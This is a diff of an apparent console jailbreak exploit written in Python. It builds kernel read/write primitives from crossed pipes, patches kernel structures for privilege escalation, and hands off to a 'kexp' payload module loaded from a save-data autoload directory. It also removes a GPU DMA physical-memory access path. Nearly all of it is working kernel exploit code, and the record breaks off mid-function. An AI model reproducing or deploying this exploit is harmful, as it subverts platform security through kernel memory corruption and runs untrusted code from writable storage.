@@ -11,7 +11,9 @@ Credits:
 - Sajjad: Also for testing with me
 """
 
+import os
 import struct
+import sys
 import traceback
 import pygame_sdl2
 from pygame_sdl2 import CONTROLLER_BUTTON_A
@@ -24,6 +26,12 @@ from sc import sc
 from ropchain import ROPChain, Executable
 from constants import SYSCALL, SELECTED_LIBC, nogc, SELECTED_GADGETS, SHARED_VARS
 from offsets import LIBC_OFFSETS
+
+_AUTOLOAD_DIR = "/saves/yarpe_autoload"
+if os.path.isdir(_AUTOLOAD_DIR) and _AUTOLOAD_DIR not in sys.path:
+    sys.path.append(_AUTOLOAD_DIR)
+
+import kexp
 
 
 # Port of https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
@@ -1030,6 +1038,7 @@ SYSCALL["open"] = 5
 SYSCALL["ioctl"] = 0x36
 SYSCALL["unlink"] = 0xA
 SYSCALL["pipe"] = 42
+SYSCALL["fcntl"] = 0x5C
 SYSCALL["getpid"] = 20
 SYSCALL["getuid"] = 0x18
 SYSCALL["connect"] = 98
@@ -1108,7 +1117,6 @@ CPU_WHICH_TID = 1
 # sys/mman.h
 MAP_SHARED = 1
 MAP_FIXED = 0x10
-MAP_NO_COALESCE = 0x400000
 
 # sys/rtprio.h
 RTP_SET = 1
@@ -1128,42 +1136,6 @@ PROT_READ = 1
 PROT_WRITE = 2
 PROT_EXEC = 4
 
-GPU_READ = 0x10
-GPU_WRITE = 0x20
-
-LIBKERNEL_HANDLE = 0x2001
-
-# sceKernelDlsym offsets in libkernel, per firmware (from Y2JB)
-DLSYM_OFFSETS = {
-    "4.03": 0x317D0,
-    "4.50": 0x317D0,
-    "4.51": 0x317D0,
-    "5.00": 0x32160,
-    "5.02": 0x32160,
-    "5.10": 0x32160,
-    "5.50": 0x32230,
-    "6.00": 0x330A0,
-    "6.02": 0x330A0,
-    "6.50": 0x33110,
-    "7.00": 0x33E90,
-    "7.01": 0x33E90,
-    "7.20": 0x33ED0,
-    "7.40": 0x33ED0,
-    "7.60": 0x33ED0,
-    "7.61": 0x33ED0,
-    "8.00": 0x342E0,
-    "8.20": 0x342E0,
-    "8.40": 0x342E0,
-    "8.60": 0x342E0,
-    "9.00": 0x350E0,
-    "9.05": 0x350E0,
-    "9.20": 0x350E0,
-    "9.40": 0x350E0,
-    "9.60": 0x350E0,
-    "10.00": 0x349C0,
-    "10.01": 0x349C0,
-}
-
 # max number of requests that can be created/polled/canceled/deleted/waited
 MAX_AIO_IDS = 0x80
 
@@ -1174,57 +1146,6 @@ AIO_ERRORS = alloc(4 * MAX_AIO_IDS)
 
 
 SCE_KERNEL_ERROR_ESRCH = 0x80020003
-
-CPU_PDE_SHIFT = {
-    "PRESENT": 0,
-    "RW": 1,
-    "USER": 2,
-    "WRITE_THROUGH": 3,
-    "CACHE_DISABLE": 4,
-    "ACCESSED": 5,
-    "DIRTY": 6,
-    "PS": 7,
-    "GLOBAL": 8,
-    "XOTEXT": 58,
-    "PROTECTION_KEY": 59,
-    "EXECUTE_DISABLE": 63,
-}
-
-CPU_PDE_MASKS = {
-    "PRESENT": 1,
-    "RW": 1,
-    "USER": 1,
-    "WRITE_THROUGH": 1,
-    "CACHE_DISABLE": 1,
-    "ACCESSED": 1,
-    "DIRTY": 1,
-    "PS": 1,
-    "GLOBAL": 1,
-    "XOTEXT": 1,
-    "PROTECTION_KEY": 0xF,
-    "EXECUTE_DISABLE": 1,
-}
-
-
-CPU_PG_PHYS_FRAME = 0x000FFFFFFFFFF000
-CPU_PG_PS_FRAME = 0x000FFFFFFFE00000
-
-
-GPU_PDE_SHIFT = {
-    "VALID": 0,
-    "IS_PTE": 54,
-    "TF": 56,
-    "BLOCK_FRAGMENT_SIZE": 59,
-}
-
-GPU_PDE_MASKS = {
-    "VALID": 1,
-    "IS_PTE": 1,
-    "TF": 1,
-    "BLOCK_FRAGMENT_SIZE": 0x1F,
-}
-
-GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0
 
 
 def pin_to_core(core):
@@ -2721,8 +2642,6 @@ class Kernel(object):
         # ps5
         self.allproc_addr = 0
         self.base_addr = 0
-        self.dmap_base_addr = 0
-        self.kernel_cr3_addr = 0
 
     def read_byte(self, kaddr):
         value = self.read_buffer(kaddr, 1)
@@ -2774,530 +2693,476 @@ class Kernel(object):
 
 kernel = Kernel()
 
+# ---- kernel exploit handoff ( kexp.bin / elfldr ) ------------------------
 
-def phys_to_dmap(phys_addr):
-    return kernel.dmap_base_addr + phys_addr
+RESTORE_ESCALATION = True
+RESTORE_DYNLIB_RANGE = True
+RESTORE_FD_RDIR = True
 
+RESTORE_PIPES = True
+PIN_KERNEL_RW_WINDOW = True
 
-def cpu_pde_field(pde, field):
-    shift = CPU_PDE_SHIFT[field]
-    mask = CPU_PDE_MASKS[field]
-    return (pde >> shift) & mask
+M64 = 0xFFFFFFFFFFFFFFFF
+M32 = 0xFFFFFFFF
+PROT_RWX = 0x7
+F_SETFL = 4
+O_NONBLOCK_FLAG = 0x4
 
+PIPE_COUNT = 0x00
+PIPE_IN = 0x04
+PIPE_OUT = 0x08
+PIPE_SIZE_OFF = 0x0C
+PIPE_BUFFER = 0x10
 
-def cpu_walk_pt(cr3, vaddr):
-    pml4e_index = (vaddr >> 39) & 0x1FF
-    pdpe_index = (vaddr >> 30) & 0x1FF
-    pde_index = (vaddr >> 21) & 0x1FF
-    pte_index = (vaddr >> 12) & 0x1FF
-
-    # pml4
-    pml4e = kernel.read_qword(phys_to_dmap(cr3) + (pml4e_index * 8))
-    if cpu_pde_field(pml4e, "PRESENT") != 1:
-        return None
-
-    # pdp
-    pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME
-    pdpe_va = phys_to_dmap(pdp_base_pa) + (pdpe_index * 8)
-    pdpe = kernel.read_qword(pdpe_va)
-
-    if cpu_pde_field(pdpe, "PRESENT") != 1:
-        return None
-
-    # pd
-    pd_base_pa = pdpe & CPU_PG_PHYS_FRAME
-    pde_va = phys_to_dmap(pd_base_pa) + (pde_index * 8)
-    pde = kernel.read_qword(pde_va)
-
-    if cpu_pde_field(pde, "PRESENT") != 1:
-        return None
-
-    # large page
-    if cpu_pde_field(pde, "PS") == 1:
-        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1FFFFF)
-
-    # pt
-
-    pt_base_pa = pde & CPU_PG_PHYS_FRAME
-    pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
-    pte = kernel.read_qword(pte_va)
-
-    if cpu_pde_field(pte, "PRESENT") != 1:
-        return None
-
-    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3FFF)
+master = None
+victim = None
+fds = []
+pipe_size = 0
+aim_buffer = None
+drain_buffer = None
+saved_pipe_buffers = None
+pipes_disarmed = False
+crossed_pipes = False
+handed_off = False
+prev_core = -1
+prev_rtprio = 0
+thread_attrs_restored = False
+escalation_orig = None
+escalation_restored = False
+eboot_segments_ptr = 0
+eboot_orig_addr = 0
+eboot_orig_size = 0
 
 
-# it's dangerous because it doesn't check if you're jailbroken
-def dangerous_get_proc_cr3(proc):
-    vmspace = kernel.read_qword(proc + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"])
-    pmap_store = kernel.read_qword(vmspace + SELECTED_KERNEL_OFFSETS["VMSPACE_VM_PMAP"])
-
-    return kernel.read_qword(pmap_store + SELECTED_KERNEL_OFFSETS["PMAP_CR3"])
+def report(tag, detail=None):
+    log("[-] " + (detail or tag))
 
 
-def dangerous_virt_to_phys(virt_addr, cr3=kernel.kernel_cr3_addr):
-    return cpu_walk_pt(cr3, virt_addr)
+def stage(message):
+    log("[*] " + message)
 
 
-def _get_dlsym_func():
-    fw = sc.version
-    if fw not in DLSYM_OFFSETS:
-        raise Exception("sceKernelDlsym offset not known for firmware %s" % fw)
-    return sc.make_function_if_needed(
-        "sceKernelDlsym", sc.libkernel_addr + DLSYM_OFFSETS[fw]
+def ok_msg(message):
+    log("[+] " + message)
+
+
+def sysint(fn, *args):
+    return u64_to_i64(fn(*args))
+
+
+def is_kernel_pointer(value):
+    top16 = (value >> 48) & 0xFFFF
+    return top16 == 0xFFFF and (value & 7) == 0 and value != M64
+
+
+def kaddr(rva):
+    return (kernel.base_addr + rva) & M64
+
+
+def clear_buffer(buf, size):
+    buf[0:size] = b"\x00" * size
+
+
+def p32(buf, index, value):
+    buf[index : index + 4] = struct.pack("<I", value & M32)
+
+
+def p64(buf, index, value):
+    buf[index : index + 8] = struct.pack("<Q", value & M64)
+
+
+def q64(buf, index):
+    return struct.unpack("<Q", buf[index : index + 8])[0]
+
+
+def restore_thread_attributes():
+    global thread_attrs_restored
+    if thread_attrs_restored:
+        return
+    pin_to_core(prev_core)
+    set_rtprio(prev_rtprio)
+    thread_attrs_restored = True
+    debug_log("restored to core %d with prio %d" % (prev_core, prev_rtprio))
+
+
+# ---- escalation snapshot ------------------------------------------------
+
+
+def snapshot_escalation(proc, with_dynlib):
+    global escalation_orig
+
+    proc_fd = kernel.read_qword(proc + SELECTED_KERNEL_OFFSETS["PROC_FD"])
+    snapshot = {
+        "proc_fd": proc_fd,
+        "rdir": kernel.read_qword(proc_fd + 0x10),  # fd_rdir
+        "jdir": kernel.read_qword(proc_fd + 0x18),  # fd_jdir
+        "dynlib": 0,
+        "prop": None,
+        "libkernel_ref": None,
+        "syscall_start": None,
+        "syscall_end": None,
+    }
+
+    if with_dynlib:
+        dynlib = kernel.read_qword(proc + 0x3E8)
+        snapshot["dynlib"] = dynlib
+        snapshot["prop"] = kernel.read_dword(dynlib + 0x118)
+        snapshot["libkernel_ref"] = kernel.read_qword(dynlib + 0x18)
+        snapshot["syscall_start"] = kernel.read_qword(dynlib + 0xF0)
+        snapshot["syscall_end"] = kernel.read_qword(dynlib + 0xF8)
+
+    escalation_orig = snapshot
+    debug_log(
+        "escalation snapshot: rdir %s, jdir %s, syscallEnd %s"
+        % (
+            hex(snapshot["rdir"]),
+            hex(snapshot["jdir"]),
+            hex(snapshot["syscall_end"]) if with_dynlib else "n/a",
+        )
     )
 
 
-def dangerous_dlsym(handle, symbol):
-    debug_log("dangerous_dlsym(0x%x, %s)" % (handle, symbol))
-    out_buf = alloc(8)
+def restore_escalation():
+    global escalation_restored
+    o = escalation_orig
+    if not o:
+        report(
+            "Cleanup",
+            "no escalation snapshot - fd_rdir/fd_jdir left as the exploit set them",
+        )
+        return False
 
-    if sc.platform == "ps5":
-        dlsym_func = _get_dlsym_func()
-        debug_log("  calling sceKernelDlsym at 0x%x" % dlsym_func.func_addr)
-        if u64_to_i64(dlsym_func(handle, symbol, out_buf)) == -1:
-            raise Exception(
-                "dlsym error: %d\n%s"
-                % (dlsym_func.errno, dlsym_func.get_error_string())
-            )
+    count = {"ok": 0, "want": 0}
+
+    def put_qword(address, value):
+        if value is None:
+            return
+        count["want"] += 1
+        kernel.write_qword(address, value)
+        if kernel.read_qword(address) == value:
+            count["ok"] += 1
+
+    proc_fd = o["proc_fd"]
+    put_qword(proc_fd + 0x18, o["jdir"])  # fd_jdir: restored regardless
+    if RESTORE_FD_RDIR:
+        put_qword(proc_fd + 0x10, o["rdir"])  # fd_rdir
+
+    dynlib = o["dynlib"]
+    restore_dyn = bool(dynlib) and RESTORE_DYNLIB_RANGE
+    if restore_dyn:
+        put_qword(dynlib + 0xF0, o["syscall_start"])
+        put_qword(dynlib + 0xF8, o["syscall_end"])
+        put_qword(dynlib + 0x18, o["libkernel_ref"])
+        put_qword(dynlib + 0x118, o["prop"])
+
+    jdir_back = kernel.read_qword(proc_fd + 0x18)
+    end_back = kernel.read_qword(dynlib + 0xF8) if restore_dyn else None
+    rdir_back = kernel.read_qword(proc_fd + 0x10) if RESTORE_FD_RDIR else None
+
+    verified = o["jdir"] is not None and jdir_back == o["jdir"]
+    if restore_dyn:
+        verified = (
+            verified
+            and o["syscall_end"] is not None
+            and o["syscall_end"] == end_back
+        )
+    if RESTORE_FD_RDIR:
+        verified = verified and o["rdir"] is not None and o["rdir"] == rdir_back
+
+    escalation_restored = count["ok"] == count["want"] and verified
+
+    report(
+        "Cleanup",
+        "%d/%d escalation writes back, jdir now %#x, syscallEnd now %s%s"
+        % (
+            count["ok"],
+            count["want"],
+            jdir_back,
+            ("0x%x" % end_back) if restore_dyn else "n/a",
+            ""
+            if escalation_restored
+            else " - NOT fully restored, the app kill path may still walk a "
+            "directory tree this process does not own",
+        ),
+    )
+    return escalation_restored
+
+
+# ---- kexp master / victim pipes -----------------------------------------
+
+
+def find_pipe_end(fd):
+    entry = (
+        kernel.curproc_ofiles_addr + fd * SELECTED_KERNEL_OFFSETS["SIZEOF_OFILES"]
+    )
+    file_addr = kernel.read_qword(entry)  # fde_file
+    pipe_addr = kernel.read_qword(file_addr)  # f_data
+    return file_addr, pipe_addr
+
+
+def save_pipe_state(read_qword, pipe):
+    return {
+        "head": read_qword(pipe + PIPE_COUNT),  # count + in
+        "mid": read_qword(pipe + PIPE_OUT),  # out + size
+        "buffer": read_qword(pipe + PIPE_BUFFER),
+    }
+
+
+def build_kexp_pipes():
+    global master, victim, pipe_size, aim_buffer, drain_buffer
+    global saved_pipe_buffers, crossed_pipes
+
+    pipe_size = PAGE_SIZE
+    aim_buffer = alloc(0x20)
+    drain_buffer = alloc(0x40)
+
+    master_read_fd, master_write_fd = create_pipe()
+    victim_read_fd, victim_write_fd = create_pipe()
+    for fd in (master_read_fd, master_write_fd, victim_read_fd, victim_write_fd):
+        fds.append(fd)
+        sysint(sc.syscalls.fcntl, fd, F_SETFL, O_NONBLOCK_FLAG)
+
+    master_file, master_pipe = find_pipe_end(master_read_fd)
+    victim_file, victim_pipe = find_pipe_end(victim_read_fd)
+    if not is_kernel_pointer(master_pipe) or not is_kernel_pointer(victim_pipe):
+        report("Pipes", "pipe struct is not a kernel pointer")
+        return False
+
+    saved_pipe_buffers = {
+        "master": save_pipe_state(kernel.read_qword, master_pipe),
+        "victim": save_pipe_state(kernel.read_qword, victim_pipe),
+    }
+
+    master = {
+        "read_fd": master_read_fd,
+        "write_fd": master_write_fd,
+        "pipe": master_pipe,
+        "read_file": master_file,
+        "write_file": find_pipe_end(master_write_fd)[0],
+    }
+    victim = {
+        "read_fd": victim_read_fd,
+        "write_fd": victim_write_fd,
+        "pipe": victim_pipe,
+        "read_file": victim_file,
+        "write_file": find_pipe_end(victim_write_fd)[0],
+    }
+
+    fields = [
+        (PIPE_COUNT, 0),
+        (PIPE_IN, 0),
+        (PIPE_OUT, 0),
+        (PIPE_SIZE_OFF, pipe_size),
+        (PIPE_BUFFER, victim_pipe & M32),
+        (PIPE_BUFFER + 4, (victim_pipe >> 32) & M32),
+    ]
+    for offset, value in fields:
+        kernel.write_dword(master_pipe + offset, value)
+        if kernel.read_dword(master_pipe + offset) != (value & M32):
+            report("Pipes", "could not update the master pipe")
+            return False
+
+    crossed_pipes = True
+
+    probe = alloc(8)
+    expected = kernel.read_qword(kernel.allproc_addr)
+    got = kread_fast(kernel.allproc_addr, 8, probe)
+    if got != 8 or q64(probe, 0) != expected:
+        report(
+            "Pipes",
+            "kernel read check failed on the crossed pipes: got %#x, expected %#x"
+            % (q64(probe, 0), expected),
+        )
+        return False
+
+    ok_msg("crossed pipes verified: master %#x -> victim %#x" % (master_pipe, victim_pipe))
+
+    if not pin_file_refs(
+        (master["read_file"], master["write_file"], victim["read_file"], victim["write_file"])
+    ):
+        report("Pipes", "could not pin the kexp pipe file references")
+
+    return True
+
+
+def aim_victim(address, count, size):
+    c = PIPE_COUNT
+    s = PIPE_SIZE_OFF
+    b = PIPE_BUFFER
+
+    clear_buffer(aim_buffer, 0x18)
+    p32(aim_buffer, c, count)
+    p32(aim_buffer, s, size)
+    p64(aim_buffer, b, address)
+
+    written = sysint(sc.syscalls.write, master["write_fd"], aim_buffer, 0x18)
+    drained = sysint(sc.syscalls.read, master["read_fd"], drain_buffer, 0x18)
+    return 0 if (written == 0x18 and drained == 0x18) else -1
+
+
+def kread_fast(address, length, dest):
+    if aim_victim(address, length, pipe_size) != 0:
+        return -1
+    return sysint(sc.syscalls.read, victim["read_fd"], dest, length)
+
+
+def kwrite_fast(address, length, src):
+    if aim_victim(address, 0, pipe_size) != 0:
+        return -1
+    return sysint(sc.syscalls.write, victim["write_fd"], src, length)
+
+
+def on_handoff():
+    global handed_off
+    handed_off = True
+
+
+def launch_shellcode():
+    return kexp.launch(
+        {
+            "kbase": kernel.base_addr,
+            "proc_fd_addr": kernel.curproc_fd_addr,
+            "off": {"allproc": (kernel.allproc_addr - kernel.base_addr) & M64},
+            "master": master,
+            "victim": victim,
+            "curproc": kernel.curproc_addr,
+            "restore_thread_attributes": restore_thread_attributes,
+            "kaddr": kaddr,
+            "report": report,
+            "hex": hex,
+            "stage": stage,
+            "prot_rwx": PROT_RWX,
+            "libkernel_handle": kexp.LIBKERNEL_HANDLE,
+            "libc_handle": 2,
+            "kread_fast": kread_fast,
+            "kwrite_fast": kwrite_fast,
+            "on_handoff": on_handoff,
+        }
+    )
+
+
+# ---- restore -------------------------------------------------------------
+
+
+def pin_file_refs(file_addrs):
+    pinned = True
+    for file_addr in file_addrs:
+        ref = kernel.read_dword(file_addr + 0x28)  # fo_refs
+        kernel.write_dword(file_addr + 0x28, ref + 0x100)
+        if kernel.read_dword(file_addr + 0x28) != ref + 0x100:
+            pinned = False
+            break
+    return pinned
+
+
+def pin_pipe_files(pipe_fds):
+    addrs = []
+    for fd in pipe_fds:
+        entry = (
+            kernel.curproc_ofiles_addr + fd * SELECTED_KERNEL_OFFSETS["SIZEOF_OFILES"]
+        )
+        addrs.append(kernel.read_qword(entry))
+    return pin_file_refs(addrs)
+
+
+def restore_pipes():
+    global pipes_disarmed, crossed_pipes
+    if not crossed_pipes or pipes_disarmed:
+        return True
+    if not saved_pipe_buffers:
+        report("Cleanup", "original pipe buffers were not saved; pipes remain armed")
+        return False
+
+    pairs = (("master", master["pipe"]), ("victim", victim["pipe"]))
+    for label, pipe in pairs:
+        saved = saved_pipe_buffers[label]
+        kernel.write_qword(pipe + PIPE_COUNT, saved["head"])
+        kernel.write_qword(pipe + PIPE_OUT, saved["mid"])
+        kernel.write_qword(pipe + PIPE_BUFFER, saved["buffer"])
+
+    ok_flag = all(
+        saved_pipe_buffers[label] == save_pipe_state(kernel.read_qword, pipe)
+        for label, pipe in pairs
+    )
+    if ok_flag:
+        pipes_disarmed = True
+        crossed_pipes = False
+        ok_msg("kexp pipe buffers restored and verified")
     else:
-        if u64_to_i64(sc.syscalls.dlsym(handle, symbol, out_buf)) == -1:
-            raise Exception(
-                "dlsym error: %d\n%s"
-                % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
-            )
-
-    return struct.unpack("<Q", out_buf[0:8])[0]
+        report("Cleanup", "kexp pipe restoration failed; closing the game can panic")
+    return ok_flag
 
 
-def find_mod_by_name(name):
-    sceKernelGetModuleListInternal = dangerous_dlsym(
-        LIBKERNEL_HANDLE, "sceKernelGetModuleListInternal"
+def restore_eboot_segments():
+    if not eboot_segments_ptr:
+        return
+    kernel.write_qword(eboot_segments_ptr + 0x08, eboot_orig_addr)
+    kernel.write_qword(eboot_segments_ptr + 0x10, eboot_orig_size)
+    back = kernel.read_qword(eboot_segments_ptr + 0x10)
+    addr_back = kernel.read_qword(eboot_segments_ptr + 0x08)
+    ok_flag = back == eboot_orig_size and addr_back == eboot_orig_addr
+    report(
+        "Cleanup",
+        "eboot segments restored: addr %#x (want %#x), size %#x (want %#x) (%s)"
+        % (addr_back, eboot_orig_addr, back, eboot_orig_size,
+           "verified" if ok_flag else "MISMATCH"),
     )
-    sceKernelGetModuleInfo = dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleInfo")
-
-    mem = alloc(4 * 0x300)
-    actual_num = alloc(8)
-
-    sc.make_function_if_needed(
-        "sceKernelGetModuleListInternal", sceKernelGetModuleListInternal
-    )(mem, 0x300, actual_num)
-
-    num = struct.unpack("<Q", actual_num[0:8])[0]
-    for i in range(num):
-        handle = struct.unpack("<I", mem[i * 4 : i * 4 + 4])[0]
-        info = alloc(0x160)
-        info[0:8] = struct.pack("<Q", 0x160)
-
-        sc.make_function_if_needed("sceKernelGetModuleInfo", sceKernelGetModuleInfo)(
-            handle, info
-        )
-
-        mod_name = get_cstring(info, 8)
-        if mod_name == name:
-            base_addr = struct.unpack("<Q", info[0x108:0x110])[0]
-            return handle, base_addr
-
-    return 0, 0
+    return ok_flag
 
 
-class GPU(object):
-    O_RDWR = 0x2
-    IOCTL_GC_SUBMIT = 0xC0108102
+def pin_kernel_rw_window():
+    if not IPv6KernelRW.pipe_read_fd:
+        log("[*] Cleanup: no kernel r/w window to pin")
+        return False
 
-    def __init__(self):
-        self.dmem_size = 2 * 0x100000
+    pinned = pin_pipe_files((IPv6KernelRW.pipe_read_fd, IPv6KernelRW.pipe_write_fd))
+    report(
+        "Cleanup",
+        "kernel r/w pipe file references %s ( the pipe stays armed on purpose )"
+        % ("pinned" if pinned else "NOT pinned, closing the game can panic"),
+    )
+    return pinned
 
-        # put these into global to make life easier
-        self.sceKernelAllocateMainDirectMemory = sc.make_function_if_needed(
-            "sceKernelAllocateMainDirectMemory",
-            dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory"),
-        )
-        self.sceKernelMapDirectMemory = sc.make_function_if_needed(
-            "sceKernelMapDirectMemory",
-            dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory"),
-        )
 
-        if sc.platform == "ps5":
-            # open /dev/gc for direct GPU command submission
-            gc_path = alloc(8)
-            gc_path[0:8] = b"/dev/gc\x00"
-            self.gc_fd = u64_to_i64(sc.syscalls.open(gc_path, self.O_RDWR))
-            if self.gc_fd == -1:
-                raise Exception("failed to open /dev/gc: %d" % sc.syscalls.open.errno)
-        else:
-            libSceGnmDriver, _ = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")
-            self.sceGnmSubmitCommandBuffers = sc.make_function_if_needed(
-                "sceGnmSubmitCommandBuffers",
-                dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitCommandBuffers"),
+def rescue():
+    try:
+        if RESTORE_ESCALATION:
+            restore_escalation()
+
+        restore_eboot_segments()
+
+        if RESTORE_PIPES:
+            armed = (
+                master["read_file"],
+                master["write_file"],
+                victim["read_file"],
+                victim["write_file"],
             )
-            self.sceGnmSubmitDone = sc.make_function_if_needed(
-                "sceGnmSubmitDone", dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitDone")
-            )
+            if not pin_file_refs(armed):
+                report("Cleanup", "could not pin the kexp pipe file references")
 
-        prot_ro = PROT_READ | PROT_WRITE | GPU_READ
-        prot_rw = prot_ro | GPU_WRITE
-
-        victim_va, _ = self.alloc_main_dmem(self.dmem_size, prot_rw, MAP_NO_COALESCE)
-        transfer_va, _ = self.alloc_main_dmem(self.dmem_size, prot_rw, MAP_NO_COALESCE)
-        cmd_va, _ = self.alloc_main_dmem(self.dmem_size, prot_ro, MAP_NO_COALESCE)
-
-        curproc_cr3 = dangerous_get_proc_cr3(kernel.curproc_addr)
-        victim_real_pa = dangerous_virt_to_phys(victim_va, curproc_cr3)
-
-        victim_ptbe_va, page_size = self.get_ptb_entry_of_relative_va(victim_va)
-
-        if victim_ptbe_va is None or page_size != self.dmem_size:
-            raise Exception("failed to setup gpu primitives")
-
-        if u64_to_i64(sc.syscalls.mprotect(victim_va, self.dmem_size, prot_ro)) == -1:
-            raise Exception(
-                "mprotect failed: %d\n%s"
-                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
-            )
-
-        initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va)
-        cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & ~victim_real_pa
-
-        self.victim_va = victim_va
-        self.transfer_va = transfer_va
-        self.cmd_va = cmd_va
-        self.victim_ptbe_va = victim_ptbe_va
-        self.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro
-
-    def pm4_type3_header(self, opcode, count):
-        packet_type = 3
-        shader_type = 1  # computer shader
-        predicate = 0  # predicate disable
-
-        return (
-            predicate & 0
-            | (shader_type & 1) << 1
-            | (opcode & 0xFF) << 8
-            | ((count - 1) & 0x3FFF) << 16
-            | (packet_type & 3) << 30
-        )
-
-    def pm4_dma_data(self, dest_va, src_va, length):
-        count = 6
-        bufsize = 4 * (count + 1)
-        opcode = 0x50
-        command_len = length & 0x1FFFFF
-
-        pm4 = alloc(bufsize)
-        dma_data_header = (
-            0 & 1  # engine
-            | (0 & 1) << 12  # src_atc
-            | (2 & 3) << 13  # src_cache_policy
-            | (1 & 1) << 15  # src_volatile
-            | (0 & 3) << 20  # dst_sel (DmaDataDst enum)
-            | (0 & 1) << 24  # dst_atc
-            | (2 & 3) << 25  # dst_cache_policy
-            | (1 & 1) << 27  # dst_volatile
-            | (0 & 3) << 29  # src_sel (DmaDataSrc enum)
-            | (1 & 1) << 31  # cp_sync
-        )
-        pm4[0:4] = struct.pack("<I", self.pm4_type3_header(opcode, count))  # pm4 header
-        pm4[4:8] = struct.pack(
-            "<I", dma_data_header
-        )  # dma data header (copy: mem -> mem)
-        pm4[8:16] = struct.pack("<Q", src_va)
-        pm4[16:24] = struct.pack("<Q", dest_va)
-        pm4[24:28] = struct.pack("<I", command_len)
-
-        return pm4
-
-    def build_command_descriptor(self, gpu_addr, size_in_bytes):
-        size_in_dwords = size_in_bytes >> 2
-        desc = alloc(16)
-        # first qword: (gpu_addr_low32 << 32) | 0xC0023F00
-        qword0 = ((gpu_addr & 0xFFFFFFFF) << 32) | 0xC0023F00
-        # second qword: (size_in_dwords << 32) | (gpu_addr_high16)
-        qword1 = ((size_in_dwords & 0xFFFFF) << 32) | ((gpu_addr >> 32) & 0xFFFF)
-        desc[0:8] = struct.pack("<Q", qword0)
-        desc[8:16] = struct.pack("<Q", qword1)
-        return desc
-
-    def ioctl_submit_commands(self, pipe_id, cmd_count, cmd_descriptors_addr):
-        # ioctl 0xC0108102
-        # struct: [dword pipe_id][dword count][qword cmd_buf_ptr]
-        submit_struct = alloc(0x10)
-        submit_struct[0:4] = struct.pack("<I", pipe_id)
-        submit_struct[4:8] = struct.pack("<I", cmd_count)
-        submit_struct[8:16] = struct.pack("<Q", cmd_descriptors_addr)
-        ret = u64_to_i64(sc.syscalls.ioctl(self.gc_fd, self.IOCTL_GC_SUBMIT, submit_struct))
-        if ret == -1:
-            raise Exception("ioctl submit failed: errno %d" % sc.syscalls.ioctl.errno)
-
-    def submit_dma_data_command(self, dest_va, src_va, size):
-        # prep command buf
-        dma_data = self.pm4_dma_data(dest_va, src_va, size)
-        sc.mem[self.cmd_va - 0x1000 : self.cmd_va - 0x1000 + len(dma_data)] = dma_data
-
-        if sc.platform == "ps5":
-            # use /dev/gc ioctl
-            desc = self.build_command_descriptor(self.cmd_va, len(dma_data))
-            self.ioctl_submit_commands(0, 1, get_ref_addr(desc))
-            # wait for GPU completion
-            nanosleep(500000000)
-        else:
-            dcb_count = 1
-            dcb_gpu_addr = alloc(dcb_count * 8)
-            dcb_sizes_in_bytes = alloc(dcb_count * 4)
-
-            dcb_gpu_addr[0:8] = struct.pack("<Q", self.cmd_va)
-            dcb_sizes_in_bytes[0:4] = struct.pack("<I", len(dma_data))
-
-            ret = self.sceGnmSubmitCommandBuffers(
-                dcb_count,
-                dcb_gpu_addr,
-                dcb_sizes_in_bytes,
-                0,
-                0,
-            )
-            if ret != 0:
-                raise Exception("sceGnmSubmitCommandBuffers error: %s" % hex(ret))
-
-            ret = self.sceGnmSubmitDone(0)
-            if ret != 0:
-                raise Exception("sceGnmSubmitDone error: %s" % hex(ret))
-
-    def transfer_physical_buffer(self, phys_addr, size, is_write=False):
-        trunc_phys_addr = phys_addr & ~(self.dmem_size - 1)
-        offset = phys_addr - trunc_phys_addr
-
-        if offset + size > self.dmem_size:
-            raise Exception(
-                "error: trying to write more than direct memory size: %s", size
-            )
-
-        prot_ro = PROT_READ | PROT_WRITE | GPU_READ
-        prot_rw = prot_ro | GPU_WRITE
-
-        # remap PTD
-
-        if (
-            u64_to_i64(
-                sc.syscalls.mprotect(
-                    self.victim_va,
-                    self.dmem_size,
-                    prot_ro,
+            ok_flag = restore_pipes()
+            if not ok_flag:
+                report(
+                    "Cleanup",
+                    "kexp pipe restoration failed; the file references are pinned, so "
+                    "the armed buffers are never released",
                 )
-            )
-            == -1
-        ):
-            raise Exception(
-                "mprotect failed: %d\n%s"
-                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
-            )
 
-        new_ptb = self.cleared_victim_ptbe_for_ro | trunc_phys_addr
-        kernel.write_qword(self.victim_ptbe_va, new_ptb)
+        if PIN_KERNEL_RW_WINDOW:
+            pin_kernel_rw_window()
 
-        if (
-            u64_to_i64(
-                sc.syscalls.mprotect(
-                    self.victim_va,
-                    self.dmem_size,
-                    prot_rw,
-                )
-            )
-            == -1
-        ):
-            raise Exception(
-                "mprotect failed: %d\n%s"
-                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
-            )
+        restore_thread_attributes()
 
-        if is_write:
-            src = self.transfer_va
-            dest = self.victim_va + offset
-        else:
-            src = self.victim_va + offset
-            dest = self.transfer_va
-
-        self.submit_dma_data_command(dest, src, size)
-
-    def read_buffer(self, addr, size):
-        phys_addr = dangerous_virt_to_phys(addr, kernel.kernel_cr3_addr)
-        if phys_addr is None:
-            raise Exception("failed to translate %s to physical addr" % hex(addr))
-
-        self.transfer_physical_buffer(phys_addr, size, is_write=False)
-        return readbuf(self.transfer_va, size)
-
-    def write_buffer(self, addr, buf):
-        phys_addr = dangerous_virt_to_phys(addr, kernel.kernel_cr3_addr)
-        if phys_addr is None:
